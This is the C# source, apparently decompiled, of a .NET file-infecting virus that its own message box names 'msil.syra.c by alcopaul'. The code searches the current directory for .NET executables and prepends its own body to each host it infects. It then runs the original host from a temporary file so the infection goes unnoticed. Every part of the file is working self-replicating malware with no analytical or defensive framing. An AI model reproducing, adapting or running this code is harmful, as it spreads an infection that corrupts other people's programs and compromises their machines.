using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

internal class msil_syra_c
{
	public class w32api
	{
		[DllImport("shell32.dll", CharSet = CharSet.Auto)]
		public static extern int ShellExecute(int hWnd, string oper, string file, string param, string dir, int type);

		[DllImport("user32.dll", CharSet = CharSet.Auto)]
		public static extern int MessageBox(int hWnd, string text, string caption, uint type);
	}

	public static void Main(string[] args)
	{
		Module module = Assembly.GetExecutingAssembly().GetModules()[0];
		string[] files = Directory.GetFiles(Directory.GetCurrentDirectory(), "*.exe");
		string[] array = files;
		foreach (string text in array)
		{
			try
			{
				AssemblyName.GetAssemblyName(text);
				if (Sha1(module.FullyQualifiedName) == Sha1(text))
				{
					continue;
				}
				try
				{
					Infect(text);
				}
				catch
				{
					goto end_IL_0031;
				}
				break;
				end_IL_0031:;
			}
			catch
			{
			}
		}
		FileStream fileStream = new FileStream(module.FullyQualifiedName, FileMode.OpenOrCreate, FileAccess.Read);
		BinaryReader binaryReader = new BinaryReader(fileStream);
		int num = (int)fileStream.Length;
		int num2 = num - 5632;
		binaryReader.BaseStream.Seek(5632L, SeekOrigin.Begin);
		byte[] buffer = new byte[checked((uint)num2)];
		int num3 = num2;
		int num4 = 0;
		while (num3 > 0)
		{
			int num5 = binaryReader.Read(buffer, num4, num3);
			if (num5 == 0)
			{
				break;
			}
			num4 += num5;
			num3 -= num5;
		}
		binaryReader.Close();
		Random random = new Random();
		int num6 = random.Next(2000);
		FileStream output = new FileStream("p" + num6 + "h.exe", FileMode.OpenOrCreate, FileAccess.Write);
		BinaryWriter binaryWriter = new BinaryWriter(output);
		binaryWriter.BaseStream.Seek(0L, SeekOrigin.Begin);
		binaryWriter.Write(buffer);
		binaryWriter.Close();
		string currentDirectory = Directory.GetCurrentDirectory();
		w32api.ShellExecute(0, null, "p" + num6 + "h.exe", null, currentDirectory, 1);
		do
		{
			IL_0177:
			try
			{
				File.Delete("p" + num6 + "h.exe");
			}
			catch
			{
				goto IL_0177;
			}
		}
		while (File.Exists("p" + num6 + "h.exe"));
		Random random2 = new Random();
		if (random2.Next(4) == 3)
		{
			w32api.MessageBox(0, "::::only SHA1gging .NET files::::", "msil.syra.c by alcopaul", 0u);
		}
	}

	public static void Infect(string host)
	{
		Module module = Assembly.GetExecutingAssembly().GetModules()[0];
		FileStream input = new FileStream(module.FullyQualifiedName, FileMode.OpenOrCreate, FileAccess.Read);
		BinaryReader binaryReader = new BinaryReader(input);
		binaryReader.BaseStream.Seek(0L, SeekOrigin.Begin);
		byte[] buffer = new byte[5632];
		int num = 5632;
		int num2 = 0;
		while (num > 0)
		{
			int num3 = binaryReader.Read(buffer, num2, num);
			if (num3 == 0)
			{
				break;
			}
			num2 += num3;
			num -= num3;
		}
		binaryReader.Close();
		FileStream fileStream = new FileStream(host, FileMode.OpenOrCreate, FileAccess.Read);
		BinaryReader binaryReader2 = new BinaryReader(fileStream);
		binaryReader2.BaseStream.Seek(0L, SeekOrigin.Begin);
		byte[] buffer2 = new byte[checked((uint)fileStream.Length)];
		int num4 = (int)fileStream.Length;
		int num5 = 0;
		while (num4 > 0)
		{
			int num6 = binaryReader2.Read(buffer2, num5, num4);
			if (num6 == 0)
			{
				break;
			}
			num5 += num6;
			num4 -= num6;
		}
		binaryReader2.Close();
		FileStream output = new FileStream(host, FileMode.OpenOrCreate, FileAccess.Write);
		BinaryWriter binaryWriter = new BinaryWriter(output);
		binaryWriter.BaseStream.Seek(0L, SeekOrigin.Begin);
		binaryWriter.Write(buffer);
		binaryWriter.Write(buffer2);
		binaryWriter.Close();
	}

	public static string Sha1(string data)
	{
		FileStream input = new FileStream(data, FileMode.OpenOrCreate, FileAccess.Read);
		BinaryReader binaryReader = new BinaryReader(input);
		binaryReader.BaseStream.Seek(0L, SeekOrigin.Begin);
		byte[] buffer = new byte[2048];
		int num = 2048;
		int num2 = 0;
		while (num > 0)
		{
			int num3 = binaryReader.Read(buffer, num2, num);
			if (num3 == 0)
			{
				break;
			}
			num2 += num3;
			num -= num3;
		}
		binaryReader.Close();
		SHA1 sHA = new SHA1CryptoServiceProvider();
		byte[] bytes = sHA.ComputeHash(buffer);
		return BytesToHexString(bytes);
	}

	private static string BytesToHexString(byte[] bytes)
	{
		StringBuilder stringBuilder = new StringBuilder(64);
		for (int i = 0; i < bytes.Length; i++)
		{
			stringBuilder.Append($"{bytes[i]:X2}");
		}
		return stringBuilder.ToString();
	}
}
